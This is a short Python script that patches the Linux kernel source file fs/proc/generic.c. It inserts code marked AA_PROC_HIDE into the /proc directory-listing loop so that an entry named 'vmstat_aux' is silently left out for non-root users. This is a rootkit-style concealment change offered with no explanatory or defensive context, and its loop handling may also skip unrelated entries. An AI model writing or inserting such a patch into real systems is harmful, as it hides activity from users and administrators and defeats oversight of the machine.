import pathlib
T = chr(9)
p = pathlib.Path('fs/proc/generic.c')
s = p.read_text()
if 'AA_PROC_HIDE' in s:
    print('AA_PROC_HIDE already')
else:
    anchor = T + "do {" + chr(10) + T + T + "struct proc_dir_entry *next;" + chr(10) + T + T + "pde_get(de);"
    repl = (T + "do {" + chr(10) + T + T + "struct proc_dir_entry *next;" + chr(10)
            + T + T + "/* AA_PROC_HIDE */" + chr(10)
            + T + T + 'if (!strcmp(de->name, "vmstat_aux") &&' + chr(10)
            + T + T + T + "!uid_eq(current_euid(), GLOBAL_ROOT_UID)) {" + chr(10)
            + T + T + T + "next = pde_subdir_next(de);" + chr(10)
            + T + T + T + "if (!next) { read_unlock(&proc_subdir_lock); return 1; }" + chr(10)
            + T + T + T + "de = next; ctx->pos++; continue;" + chr(10)
            + T + T + "}" + chr(10)
            + T + T + "pde_get(de);")
    if anchor in s:
        p.write_text(s.replace(anchor, repl, 1))
        print('AA_PROC_HIDE applied')
    else:
        print('AA_PROC_HIDE anchor NOT found')
